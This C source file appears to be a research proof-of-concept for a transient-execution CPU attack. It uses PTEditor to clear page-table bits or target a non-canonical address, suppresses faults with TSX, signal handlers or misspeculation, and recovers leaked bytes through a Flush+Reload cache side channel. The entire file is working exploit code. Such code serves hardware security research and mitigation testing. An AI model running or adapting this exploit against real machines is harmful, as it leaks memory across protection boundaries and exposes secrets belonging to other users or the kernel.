#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <memory.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include "../../cacheutils.h"
#include "../../PTEditor/ptedit_header.h"


#define PAGE_SIZE    4096

unsigned char __attribute__((aligned(PAGE_SIZE))) oracle1[256 * PAGE_SIZE];
unsigned char __attribute__((aligned(PAGE_SIZE))) oracle2[256 * PAGE_SIZE];
unsigned char __attribute__((aligned(PAGE_SIZE))) oracle3[256 * PAGE_SIZE];
unsigned char __attribute__((aligned(PAGE_SIZE))) read_page[4096 * 64];
unsigned char __attribute__((aligned(PAGE_SIZE))) dummy_page[4096 * 64];


void transient();

void * noncanon = (void*)0x5678ff0000000000ull,
     * nulladdr = (void*)NULL,
     * ptr_read, *ptr_write, *ptr_target;


void setup_oracle(){
  memset(oracle1, 0, sizeof(oracle1));
  memset(oracle2, 0, sizeof(oracle2));
  memset(oracle3, 0, sizeof(oracle3));

  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %zu\n", CACHE_MISS);
}


void setup_fh(){
  signal(SIGSEGV, trycatch_segfault_handler);
  signal(SIGFPE, trycatch_segfault_handler);
}

#if SUP_SPECUL
uint8_t  __attribute__((aligned(PAGE_SIZE))) throttle[8 * 4096];
void speculate_transient(int run) {
  flush(&run);
  for (int i = 0; i < 8; i++) {
      flush(throttle + i * 4096);
  }
  if((run / 2.0 / throttle[0] / throttle[4096] / throttle[8192] / throttle[3 * 4096]) >
      (throttle[4 * 4096] / throttle[5 * 4096] / throttle[6 * 4096] / throttle[7 * 4096]))
  {
      transient();
  }
}
#endif

int main(int argc, char *argv[1]) {
  setup_oracle();
  setup_fh();
  ptedit_init();

  uint64_t store_offset = 16;
  if (argc > 1)
    store_offset = atoi(argv[1]);

  #if SUP_SPECUL
  for (int i = 0; i < 8; i++) {
    throttle[i * 4096] = 1;
  }
  #endif

  memset(read_page, 0, PAGE_SIZE);
  memset(dummy_page, 0, PAGE_SIZE);

  ptr_target = read_page;

  #if FAULTASSIST_S
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_USER);
  #elif FAULTASSIST_P
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_PRESENT);
  #elif FAULTASSIST_A
  ptedit_pte_clear_bit(ptr_target, 0, PTEDIT_PAGE_BIT_ACCESSED);
  #elif FAULTASSIST_NONCAN
  ptr_target = noncanon;
  #endif

  ptedit_cleanup();
  while(1){

    // By changing the offset we can index to read different values
    ptr_write = dummy_page + store_offset;

  #if SUP_SPECUL
    ptr_read = dummy_page;
    for(int i = 0; i < 64; i++){
      speculate_transient(10);
    }

    ptr_read = ptr_target;
    speculate_transient(0);
  #else

  ptr_read = ptr_target;

  #if SUP_TSX
    if (xbegin() == (~0u)) {
      // maccess(0);

  #elif SUP_FH
    if(!setjmp(trycatch_buf)){
  #else
  {
  #endif

    transient();


  #if SUP_TSX
    xend();
  #endif
    }

  #endif

#if !LEAK_3BYTES

    for (size_t i = 1 ; i < 256; i++) {
      if (flush_reload((unsigned char*) oracle1 + 4096 * i)) {
        if (i != 0) {
          fprintf(stdout, "%02x: %c\n", (unsigned int)i, (unsigned char) i);
          fflush(stdout);
        }
      }
    }

#else
    for (int i = 1 ; i <= 0xff; i++) {
      if (flush_reload((uint8_t*) oracle1 + 4096 * i)) {
        for (int j = 1 ; j <= 0xff; j++) {
          if (flush_reload((uint8_t*) oracle2 + 4096 * j)) {
            for (int k = 1 ; k <= 0xff; k++) {
              if (flush_reload((uint8_t*) oracle3 + 4096 * k)) {
                fprintf(stdout, "%02x %02x %02x: ", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                fprintf(stdout, "%c%c%c\n", (uint8_t) i, (uint8_t)j, (uint8_t)k);
                fflush(stdout);
              }
            }
          }
        }
      }
    }

    mfence();
#endif

  }
}

inline void  transient(){
  asm volatile(
    "mov (%0), %%rbx\n"
    "mov (%1), %%rcx\n"
    "movq $0, (%%rbx)\n"
#if XMMLOAD
    "movaps (%%rcx), %%xmm0\n"
    "movq %%xmm0, %%rax\n"
#elif YMMLOAD
    "vmovups (%%rcx), %%ymm0\n"
    "vpextrq $1, %%xmm0, %%rax\n"
    "movq %%xmm0, %%rax\n"
#else
    "mov (%%rcx), %%rax\n"
#endif
    "mov %%rax, %%rbx\n"
    "mov %%rax, %%rcx\n"
    "and $0xff, %%rax\n"
    "shlq $12, %%rax\n"
    "movb (%2,%%rax,1), %%al\n"

#if LEAK_3BYTES
    "shr $8, %%rbx\n"
    "and $0xff, %%rbx\n"
    "shlq $12, %%rbx\n"
    "movb (%3,%%rbx,1), %%al\n"

    "shr $16, %%rcx\n"
    "and $0xff, %%rcx\n"
    "shlq $12, %%rcx\n"
    "movb (%4,%%rcx,1), %%al\n"
#endif
  : : "r"(&ptr_write), "r"(&ptr_read), "r"(oracle1), "r"(oracle2), "r"(oracle3):
      "rax", "rbx", "rcx", "memory");
}

